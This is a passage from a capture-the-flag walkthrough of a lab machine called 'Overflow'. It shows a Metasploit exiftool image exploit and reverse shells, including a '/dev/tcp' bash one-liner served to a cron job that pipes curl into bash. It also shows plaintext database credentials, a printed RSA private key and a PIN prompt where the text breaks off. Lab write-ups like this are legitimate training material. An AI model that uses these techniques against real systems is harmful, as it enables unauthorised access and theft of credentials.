+   ----   ---------------  --------  -----------
+   LHOST  <span class="hljs-number">192.168</span>.<span class="hljs-number">221.129</span>  yes       The listen address (an <span class="hljs-keyword">interface</span> may be specified)
+   LPORT  <span class="hljs-number">4444</span>             yes       The listen port
+
+   **DisablePayloadHandler: <span class="hljs-keyword">True</span>   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="hljs-number">0</span>   JPEG <span class="hljs-keyword">file</span>
+
+
+msf6 exploit(unix<span class="hljs-regexp">/fileformat/</span>exiftool_djvu_ant_perl_injection) &gt; set LHOST <span class="hljs-number">10.10</span>.<span class="hljs-number">14.124</span>
+LHOST =&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">14.124</span>
+msf6 exploit(unix<span class="hljs-regexp">/fileformat/</span>exiftool_djvu_ant_perl_injection) &gt; set LPORT <span class="hljs-number">80</span>
+LPORT =&gt; <span class="hljs-number">80</span>
+msf6 exploit(unix<span class="hljs-regexp">/fileformat/</span>exiftool_djvu_ant_perl_injection) &gt; run
+
+[+] msf.jpg stored at <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/.msf4/</span>local/msf.jpg
+</code></pre></div>
+<p>With our listener running, we'll upload the file to the server.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ penelope 80                                                                                                                   [21-11-15 10:39:55]
+[+] Listening for reverse shells on 0.0.0.0 🚪80 
+[+] Got reverse shell from 🐧 overflow~10.129.96.28 💀 - Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
+[+] Logging to /home/kali/.penelope/overflow~10.129.96.28/overflow~10.129.96.28.log 📜
+www-data@overflow:~/devbuild-job/home/profile$ </pre><pre class="hljs"><code><span class="hljs-variable">$ </span>penelope <span class="hljs-number">80</span>                                                                                                                   [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-15</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span>]
+[+] Listening <span class="hljs-keyword">for</span> reverse shells on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> 🚪<span class="hljs-number">80</span> 
+[+] Got reverse shell from 🐧 overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span> 💀 - Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully! 💪
+[+] Interacting <span class="hljs-keyword">with</span> session [<span class="hljs-number">1</span>], Shell <span class="hljs-symbol">Type:</span> PTY, Menu <span class="hljs-symbol">key:</span> F12
+[+] Logging to /home/kali/.penelope/overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span>/overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span>.log 📜
+www-data<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~/devbuild-job/home/profile</span><span class="hljs-variable">$ </span></code></pre></div>
+<p>We have a shell!</p>
+<p>We are operating as user www-data, which does not have access to read the <code class="inline-code">user.txt</code> file under <code class="inline-code">/home/tester</code>.  We'll need to escalate somehow.</p>
+<p>Looking through the web folders, we find db.php which contains credentials for the <code class="inline-code">developer</code> user.</p>
+<p><code class="inline-code">$lnk = mysqli_connect(&quot;localhost&quot;,&quot;developer&quot;, &quot;sh@tim@n&quot;,&quot;Overflow&quot;);</code></p>
+<p>Using those credentials, we're able to log in as <code class="inline-code">developer</code> over ssj</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ ssh developer@overflow.htb                                                                                                    [21-11-15 10:34:24]
+The authenticity of host 'overflow.htb (10.129.96.28)' can't be established.
+ECDSA key fingerprint is SHA256:0B4WxE0op8JuZcJy4GFu2LF4k8g1fkM39gxF3bi5n4s.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'overflow.htb,10.129.96.28' (ECDSA) to the list of known hosts.
+developer@overflow.htb's password: 
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Nov 15 21:16:15 IST 2021
+
+  System load:  0.01              Processes:           168
+  Usage of /:   48.9% of 5.84GB   Users logged in:     0
+  Memory usage: 12%               IP address for eth0: 10.129.96.28
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Mon Sep 27 22:49:19 2021 from 10.10.14.23
+-sh: 28: set: Illegal option -o history
+-sh: 1: set: Illegal option -o history
+$ </pre><pre class="hljs"><code><span class="hljs-string">$</span> <span class="hljs-string">ssh</span> <span class="hljs-string">developer@overflow.htb</span>                                                                                                    [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-15</span> <span class="hljs-number">10</span><span class="hljs-string">:34:24</span>]
+<span class="hljs-string">The</span> <span class="hljs-string">authenticity</span> <span class="hljs-string">of</span> <span class="hljs-string">host</span> <span class="hljs-string">&#x27;overflow.htb (10.129.96.28)&#x27;</span> <span class="hljs-string">can&#x27;t</span> <span class="hljs-string">be</span> <span class="hljs-string">established.</span>
+<span class="hljs-string">ECDSA</span> <span class="hljs-string">key</span> <span class="hljs-string">fingerprint</span> <span class="hljs-string">is</span> <span class="hljs-string">SHA256:0B4WxE0op8JuZcJy4GFu2LF4k8g1fkM39gxF3bi5n4s.</span>
+<span class="hljs-string">Are</span> <span class="hljs-string">you</span> <span class="hljs-string">sure</span> <span class="hljs-string">you</span> <span class="hljs-string">want</span> <span class="hljs-string">to</span> <span class="hljs-string">continue</span> <span class="hljs-string">connecting</span> <span class="hljs-string">(yes/no/[fingerprint])?</span> <span class="hljs-literal">yes</span>
+<span class="hljs-attr">Warning:</span> <span class="hljs-string">Permanently</span> <span class="hljs-string">added</span> <span class="hljs-string">&#x27;overflow.htb,10.129.96.28&#x27;</span> <span class="hljs-string">(ECDSA)</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">list</span> <span class="hljs-string">of</span> <span class="hljs-string">known</span> <span class="hljs-string">hosts.</span>
+<span class="hljs-string">developer@overflow.htb&#x27;s</span> <span class="hljs-attr">password:</span> 
+<span class="hljs-string">Welcome</span> <span class="hljs-string">to</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-number">18.04</span><span class="hljs-number">.6</span> <span class="hljs-string">LTS</span> <span class="hljs-string">(GNU/Linux</span> <span class="hljs-number">4.15</span><span class="hljs-number">.0</span><span class="hljs-number">-159</span><span class="hljs-string">-generic</span> <span class="hljs-string">x86_64)</span>
+
+ <span class="hljs-string">*</span> <span class="hljs-attr">Documentation:</span>  <span class="hljs-string">https://help.ubuntu.com</span>
+ <span class="hljs-string">*</span> <span class="hljs-attr">Management:</span>     <span class="hljs-string">https://landscape.canonical.com</span>
+ <span class="hljs-string">*</span> <span class="hljs-attr">Support:</span>        <span class="hljs-string">https://ubuntu.com/advantage</span>
+
+  <span class="hljs-string">System</span> <span class="hljs-string">information</span> <span class="hljs-string">as</span> <span class="hljs-string">of</span> <span class="hljs-string">Mon</span> <span class="hljs-string">Nov</span> <span class="hljs-number">15</span> <span class="hljs-number">21</span><span class="hljs-string">:16:15</span> <span class="hljs-string">IST</span> <span class="hljs-number">2021</span>
+
+  <span class="hljs-attr">System load:  0.01              Processes:</span>           <span class="hljs-number">168</span>
+  <span class="hljs-attr">Usage of /:</span>   <span class="hljs-number">48.9</span><span class="hljs-string">%</span> <span class="hljs-attr">of 5.84GB   Users logged in:</span>     <span class="hljs-number">0</span>
+  <span class="hljs-attr">Memory usage:</span> <span class="hljs-number">12</span><span class="hljs-string">%</span>               <span class="hljs-attr">IP address for eth0:</span> <span class="hljs-number">10.129</span><span class="hljs-number">.96</span><span class="hljs-number">.28</span>
+  <span class="hljs-attr">Swap usage:</span>   <span class="hljs-number">0</span><span class="hljs-string">%</span>
+
+
+<span class="hljs-number">0</span> <span class="hljs-string">updates</span> <span class="hljs-string">can</span> <span class="hljs-string">be</span> <span class="hljs-string">applied</span> <span class="hljs-string">immediately.</span>
+
+
+<span class="hljs-attr">Last login:</span> <span class="hljs-string">Mon</span> <span class="hljs-string">Sep</span> <span class="hljs-number">27</span> <span class="hljs-number">22</span><span class="hljs-string">:49:19</span> <span class="hljs-number">2021 </span><span class="hljs-string">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.23</span>
+<span class="hljs-string">-sh:</span> <span class="hljs-attr">28: set:</span> <span class="hljs-string">Illegal</span> <span class="hljs-string">option</span> <span class="hljs-string">-o</span> <span class="hljs-string">history</span>
+<span class="hljs-string">-sh:</span> <span class="hljs-attr">1: set:</span> <span class="hljs-string">Illegal</span> <span class="hljs-string">option</span> <span class="hljs-string">-o</span> <span class="hljs-string">history</span>
+<span class="hljs-string">$</span> </code></pre></div>
+<p>...but</p>
+<p>We still don't have access to <code class="inline-code">user.txt</code>.</p>
+<p>The opt folder contains a file owned by tester called commontask.sh.  It appears to download an shell script file and pass it to bash.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">developer@overflow:/opt$ ls
+commontask.sh  file_encrypt
+developer@overflow:/opt$ ls -last
+total 16
+4 drwxr-xr-x  25 root   root   4096 Sep 30 20:32 ..
+4 drwxr-xr-x   3 root   root   4096 Sep 17 21:56 .
+4 drwxr-x---+  2 root   root   4096 Sep 17 21:56 file_encrypt
+4 -rwxr-x---+  1 tester tester  109 May 28 08:47 commontask.sh
+developer@overflow:/opt$ cat commontask.sh
+#!/bin/bash
+
+#make sure its running every minute.
+
+
+bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)
+developer@overflow:/opt$ </pre><pre class="hljs"><code><span class="hljs-attribute">developer</span>@overflow:/opt$ ls
+<span class="hljs-attribute">commontask</span>.sh  file_encrypt
+<span class="hljs-attribute">developer</span>@overflow:/opt$ ls -last
+<span class="hljs-attribute">total</span> <span class="hljs-number">16</span>
+<span class="hljs-attribute">4</span> drwxr-xr-x  <span class="hljs-number">25</span> root   root   <span class="hljs-number">4096</span> Sep <span class="hljs-number">30</span> <span class="hljs-number">20</span>:<span class="hljs-number">32</span> ..
+<span class="hljs-attribute">4</span> drwxr-xr-x   <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">21</span>:<span class="hljs-number">56</span> .
+<span class="hljs-attribute">4</span> drwxr-x---+  <span class="hljs-number">2</span> root   root   <span class="hljs-number">4096</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">21</span>:<span class="hljs-number">56</span> file_encrypt
+<span class="hljs-attribute">4</span> -rwxr-x---+  <span class="hljs-number">1</span> tester tester  <span class="hljs-number">109</span> May <span class="hljs-number">28</span> <span class="hljs-number">08</span>:<span class="hljs-number">47</span> commontask.sh
+<span class="hljs-attribute">developer</span>@overflow:/opt$ cat commontask.sh
+<span class="hljs-comment">#!/bin/bash</span>
+
+<span class="hljs-comment">#make sure its running every minute.</span>
+
+
+<span class="hljs-attribute">bash</span> &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)
+<span class="hljs-attribute">developer</span>@overflow:/opt$ </code></pre></div>
+<p>The problem is, the taskmanage subdomain does not exist.  If we can modify DNS to point to a webserver on our attacking machine, we could host a custom script that would be running as the <code class="inline-code">tester</code>user.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.124/4444 0&gt;&amp;1&quot; &gt; task.sh                                            
+$ cat task.sh
+bash -i &gt;&amp; /dev/tcp/10.10.14.124/4444 0&gt;&amp;1</pre><pre class="hljs"><code>$ echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.124/4444 0&gt;&amp;1&quot;</span> &gt; <span class="hljs-keyword">task</span>.sh                                            
+$ cat <span class="hljs-keyword">task</span>.sh
+bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.124/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre></div>
+<p>Now we start our shell listener and webserver.  We should see a webrequest in less than a minute, followed by a shell.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ python3 -m http.server 80                                                                                                     [21-11-15 13:20:53]
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.96.28 - - [15/Nov/2021 13:22:02] &quot;GET /task.sh HTTP/1.1&quot; 200 -</pre><pre class="hljs"><code>$ python3 -m http.server <span class="hljs-number">80</span>                                                                                                     <span class="hljs-string">[21-11-15 13:20:53]</span>
+Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...
+<span class="hljs-number">10.129.96.28</span> - - <span class="hljs-string">[15/Nov/2021 13:22:02]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /task.sh HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ penelope 4444                                                                                                                 [21-11-15 13:20:38]
+[+] Listening for reverse shells on 0.0.0.0 🚪4444 
+[+] Got reverse shell from 🐧 overflow~10.129.96.28 💀 - Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
+[+] Logging to /home/kali/.penelope/overflow~10.129.96.28/overflow~10.129.96.28.log 📜
+&lt;d1bb20-21c1-46c3-af8a-52f73839353f; else exit 0; fi
+tester@overflow:~$ cat user.txt
+fecfbe48b22a868e2a836daf78dfcca8</pre><pre class="hljs"><code>$ penelope <span class="hljs-number">4444</span>                                                                                                                 [<span class="hljs-number">21</span>-<span class="hljs-number">11</span>-<span class="hljs-number">15</span> <span class="hljs-number">13</span>:<span class="hljs-number">20</span>:<span class="hljs-number">38</span>]
+[+] Listening <span class="hljs-keyword">for</span> reverse shells on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> 🚪<span class="hljs-number">4444</span> 
+[+] Got reverse shell from 🐧 overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span> 💀 - Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully! 💪
+[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12
+[+] Logging to <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/.penelope/</span>overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span>/overflow~<span class="hljs-number">10.129</span>.<span class="hljs-number">96.28</span>.log 📜
+&lt;d1bb20-<span class="hljs-number">21</span>c1-<span class="hljs-number">46</span>c3-af8a-<span class="hljs-number">52</span>f73839353f; <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>; fi
+tester@overflow:~$ cat user.txt
+fecfbe48b22a868e2a836daf78dfcca8</code></pre></div>
+<p>We'll upgrade our shell by generating an ssh key on the system and then using it to establish an SSH connection from our client machine.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:~/.ssh$ ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/tester/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/tester/.ssh/id_rsa.
+Your public key has been saved in /home/tester/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:H80wN2vhoWvgbKYQynV7nUeKmuimcJEmoz5DY4ap0aY tester@overflow
+The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|                 |
+|          o =    |
+|   .       O =   |
+|+o+ o . S o B    |
+|=Xo+ o + = B     |
+|B+= . . B B .    |
+|E=  .o B . .     |
+| .++o +          |
++----[SHA256]-----+
+tester@overflow:~/.ssh$ cp id_rsa.pub authorized_keys
+tester@overflow:~/.ssh$ chmod 600 ./authorized_keys 
+tester@overflow:~/.ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvJ6L+MVUNn11R94m2oV1RbnjugyIAVMkeJhX4mi8T3bch5Fv
+0WXJHiaG28fpYrPaePvalBwtqGHZgWvpj09hz0gGsEkzrAzhVtz1mHRKqgPB7ZfG
+zynr0qKT1ylmo5QVlW3f+f0FWGj7SAZOhDV8scD1/9Hd/5BAz3QXle0ixtGNInks
+IVdE+3BNPVfTafZ+ikpA5trrW3+6QZajEHT6PHVp0SfWADcM3f+lgiSInzdfjMMc
+Ok1RUYSfwBHBwPLO2DV5/6itFsPLn9+5n2EjvAGKyfs1IeQ5EfvqdH2s5QcganJE
+NfJ+vAjF2YlUyM/hWJjIzJni0NbSAX60qEAxEwIDAQABAoIBACkVk8F9Iem4jAo6
+blYcyb2FTwAgaKN5O7F05XewfowEhOaWnDeNJzCFDczjj4drS4Qcv7CRLrTFk33o
+Rnhrvw9KTgKp/zJTn+WuvWQWuIitxtj8vVY0eGRp+y/bmbq5r7Xbt/SY00g9nbZD
+gWi0ydNiB3NQgD2Ba0yEqfqDK5cIf+D7G+ahB6EPI/ACiOJr0q/KX4SmlQh7QjVY
+JYFJ8naG57lucsOWaBsGlrVNk1ZrYHIvYOMQMrscVEF1a+To6pR1hiyHOurF3zh0
+d0dnT99G4thyfszNrVpGqg9pdPwWcBZ4TPiACbwYnJc8J8zuaFiGq6ISbMulVkbS
+UCA6sgECgYEA7d8R50nBW574+85lvzW4HyObttWAa5fIG4UWDv+tYHP3A5deoU9A
+HA9q6ZyJQAfj8+A2wbdvDy5ZGeD/3U9PY0JgNebNc/A3DFNtyiUKuU+Ibo4XNuZR
+shZRNAVODPoI4oQSJAKuaiG+O/fGEcYJciZUjetbWGpDVRktaeVTWwECgYEAyv6O
+nfVI3WXiocXFWtOoya6BEo8QsM+1opAzRR1cYY2lwjx5DseA/3Nprjcy3Q/u9bc0
+MQFZ7l1c7EsI+R1/faM1pZ5GIm3JBY5WkuPLKFQR60UH0deRICvjvCdacVErnDtD
+9l12k609mKTUVXHjFkiTUEwJdcINYgpTpGtAcBMCgYA3g6sK/oSY3GYhZk8Kq//X
+jJjnt7Yr5hV2jr3SLEuLSiUo+mfEX9mHcvWxpa3GetDxdq9w0F2j/l4fEwrD3KGb
+eb84dTAX0cUXJFVoKvLwwqYFnzW9w0znshurd11629O9AbO2IcYQ0OUz26SnOz+z
+G0z6fiYoYUxrjN+zaijlAQKBgC2nEEYACxIXvt9pDhh+L6CkCU02Nae+Hvhfe9hY
+YRVjeNr1JLipL57Dwwm2Sk8jLTe/qxI2XpZYEvTlbzAvbSPBV+hWbymBDUudlmTU
+rDT2q00BKmAMHgxhMod3RkTj3230ejVnEarmtEqnD0XkJhE140OUxi/go4fgEK2S
+nVxXAoGAWBoMBd6PK2KWObKrs403jVnT6g30TSbzpe0cVtQJiGy7rPz8ASfY0oIB
+P09UK+asDUyM0LmwAxnn15iMB2Fhluf+r8jf6kAXENRJO31e7qZN3YJ6k6r+SUND
+Z3pw/HenbUvtFZ95MhWAW01JZ4xMX1p/GqdrFyI6s9xv5P9wizA=
+-----END RSA PRIVATE KEY-----
+</pre><pre class="hljs"><code>tester<span class="hljs-meta">@overflow:~/.ssh$</span> ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/tester/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/tester/.ssh/id_rsa.
+Your public key has been saved in /home/tester/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:H80wN2vhoWvgbKYQynV7nUeKmuimcJEmoz5DY4ap0aY tester<span class="hljs-meta">@overflow</span>
+The key&#x27;s randomart image is:
++---[RSA 2048]----+
+|<span class="hljs-string">                 </span>|
+|<span class="hljs-string">                 </span>|
+|<span class="hljs-string">          o =    </span>|
+|<span class="hljs-string">   .       O =   </span>|
+|<span class="hljs-string">+o+ o . S o B    </span>|
+|<span class="hljs-string">=Xo+ o + = B     </span>|
+|<span class="hljs-string">B+= . . B B .    </span>|
+|<span class="hljs-string">E=  .o B . .     </span>|
+|<span class="hljs-string"> .++o +          </span>|
++----[SHA256]-----+
+tester<span class="hljs-meta">@overflow:~/.ssh$</span> cp id_rsa.pub authorized_keys
+tester<span class="hljs-meta">@overflow:~/.ssh$</span> chmod 600 ./authorized_keys 
+tester<span class="hljs-meta">@overflow:~/.ssh$</span> cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvJ6L+MVUNn11R94m2oV1RbnjugyIAVMkeJhX4mi8T3bch5Fv
+0WXJHiaG28fpYrPaePvalBwtqGHZgWvpj09hz0gGsEkzrAzhVtz1mHRKqgPB7ZfG
+zynr0qKT1ylmo5QVlW3f+f0FWGj7SAZOhDV8scD1/9Hd/5BAz3QXle0ixtGNInks
+IVdE+3BNPVfTafZ+ikpA5trrW3+6QZajEHT6PHVp0SfWADcM3f+lgiSInzdfjMMc
+Ok1RUYSfwBHBwPLO2DV5/6itFsPLn9+5n2EjvAGKyfs1IeQ5EfvqdH2s5QcganJE
+NfJ+vAjF2YlUyM/hWJjIzJni0NbSAX60qEAxEwIDAQABAoIBACkVk8F9Iem4jAo6
+blYcyb2FTwAgaKN5O7F05XewfowEhOaWnDeNJzCFDczjj4drS4Qcv7CRLrTFk33o
+Rnhrvw9KTgKp/zJTn+WuvWQWuIitxtj8vVY0eGRp+y/bmbq5r7Xbt/SY00g9nbZD
+gWi0ydNiB3NQgD2Ba0yEqfqDK5cIf+D7G+ahB6EPI/ACiOJr0q/KX4SmlQh7QjVY
+JYFJ8naG57lucsOWaBsGlrVNk1ZrYHIvYOMQMrscVEF1a+To6pR1hiyHOurF3zh0
+d0dnT99G4thyfszNrVpGqg9pdPwWcBZ4TPiACbwYnJc8J8zuaFiGq6ISbMulVkbS
+UCA6sgECgYEA7d8R50nBW574+85lvzW4HyObttWAa5fIG4UWDv+tYHP3A5deoU9A
+HA9q6ZyJQAfj8+A2wbdvDy5ZGeD/3U9PY0JgNebNc/A3DFNtyiUKuU+Ibo4XNuZR
+shZRNAVODPoI4oQSJAKuaiG+O/fGEcYJciZUjetbWGpDVRktaeVTWwECgYEAyv6O
+nfVI3WXiocXFWtOoya6BEo8QsM+1opAzRR1cYY2lwjx5DseA/3Nprjcy3Q/u9bc0
+MQFZ7l1c7EsI+R1/faM1pZ5GIm3JBY5WkuPLKFQR60UH0deRICvjvCdacVErnDtD
+9l12k609mKTUVXHjFkiTUEwJdcINYgpTpGtAcBMCgYA3g6sK/oSY3GYhZk8Kq//X
+jJjnt7Yr5hV2jr3SLEuLSiUo+mfEX9mHcvWxpa3GetDxdq9w0F2j/l4fEwrD3KGb
+eb84dTAX0cUXJFVoKvLwwqYFnzW9w0znshurd11629O9AbO2IcYQ0OUz26SnOz+z
+G0z6fiYoYUxrjN+zaijlAQKBgC2nEEYACxIXvt9pDhh+L6CkCU02Nae+Hvhfe9hY
+YRVjeNr1JLipL57Dwwm2Sk8jLTe/qxI2XpZYEvTlbzAvbSPBV+hWbymBDUudlmTU
+rDT2q00BKmAMHgxhMod3RkTj3230ejVnEarmtEqnD0XkJhE140OUxi/go4fgEK2S
+nVxXAoGAWBoMBd6PK2KWObKrs403jVnT6g30TSbzpe0cVtQJiGy7rPz8ASfY0oIB
+P09UK+asDUyM0LmwAxnn15iMB2Fhluf+r8jf6kAXENRJO31e7qZN3YJ6k6r+SUND
+Z3pw/HenbUvtFZ95MhWAW01JZ4xMX1p/GqdrFyI6s9xv5P9wizA=
+-----END RSA PRIVATE KEY-----
+</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ chmod 600 ./tester    
+$ ssh tester@overflow -i ./tester                                                                                               [21-11-15 13:27:31]
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Nov 15 23:57:34 IST 2021
+
+  System load:  0.0               Processes:           178
+  Usage of /:   48.7% of 5.84GB   Users logged in:     1
+  Memory usage: 18%               IP address for eth0: 10.129.96.28
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have new mail.
+Last login: Mon May 31 18:14:58 2021
+tester@overflow:~$ 
+</pre><pre class="hljs"><code>$ chmod <span class="hljs-number">600</span> ./tester    
+$ ssh tester@overflow -i ./tester                                                                                               [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-15</span> <span class="hljs-number">13</span>:<span class="hljs-number">27</span>:<span class="hljs-number">31</span>]
+Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">18.04</span><span class="hljs-number">.6</span> LTS (GNU/Linux <span class="hljs-number">4.15</span><span class="hljs-number">.0</span><span class="hljs-number">-159</span>-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  <span class="hljs-keyword">System</span> information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Mon Nov <span class="hljs-number">15</span> <span class="hljs-number">23</span>:<span class="hljs-number">57</span>:<span class="hljs-number">34</span> IST <span class="hljs-number">2021</span>
+
+  <span class="hljs-keyword">System</span> <span class="hljs-keyword">load</span>:  <span class="hljs-number">0.0</span>               Processes:           <span class="hljs-number">178</span>
+  <span class="hljs-keyword">Usage</span> <span class="hljs-keyword">of</span> /:   <span class="hljs-number">48.7</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">5.84</span>GB   Users <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span>:     <span class="hljs-number">1</span>
+  Memory <span class="hljs-keyword">usage</span>: <span class="hljs-number">18</span>%               IP address <span class="hljs-keyword">for</span> eth0: <span class="hljs-number">10.129</span><span class="hljs-number">.96</span><span class="hljs-number">.28</span>
+  Swap <span class="hljs-keyword">usage</span>:   <span class="hljs-number">0</span>%
+
+
+<span class="hljs-number">0</span> updates can be applied immediately.
+
+Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> https://changelogs.ubuntu.com/meta-<span class="hljs-keyword">release</span>-lts. <span class="hljs-keyword">Check</span> your Internet <span class="hljs-keyword">connection</span> <span class="hljs-keyword">or</span> proxy settings
+
+
+You have <span class="hljs-built_in">new</span> mail.
+Last <span class="hljs-keyword">login</span>: Mon May <span class="hljs-number">31</span> <span class="hljs-number">18</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58</span> <span class="hljs-number">2021</span>
+tester@overflow:~$ 
+</code></pre></div>
+<p>Now we can read the contents of the <code class="inline-code">/opt/file_encrypt/	</code> folder.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/opt$ cd file_encrypt/
+tester@overflow:/opt/file_encrypt$ ls
+file_encrypt  README.md
+tester@overflow:/opt/file_encrypt$ cat README.md 
+Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox
+tester@overflow:/opt/file_encrypt$ 
+</pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt</span><span class="hljs-variable">$ </span>cd file_encrypt/
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>ls
+file_encrypt  README.md
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>cat README.md 
+Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application <span class="hljs-keyword">and</span> report any issue that you get as this application is still <span class="hljs-keyword">in</span> development. We have modified the tool a little bit that you can only <span class="hljs-keyword">use</span> the pin feature now. The encrypt function is there but you can<span class="hljs-string">&#x27;t use it now.The PIN should be in your inbox
+tester@overflow:/opt/file_encrypt$ 
+</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/opt/file_encrypt$ ./file_encrypt 
+This is the code 1804289383. Enter the Pin: asdfasdfasfasdfasdfasdfsa
+Wrong Pin
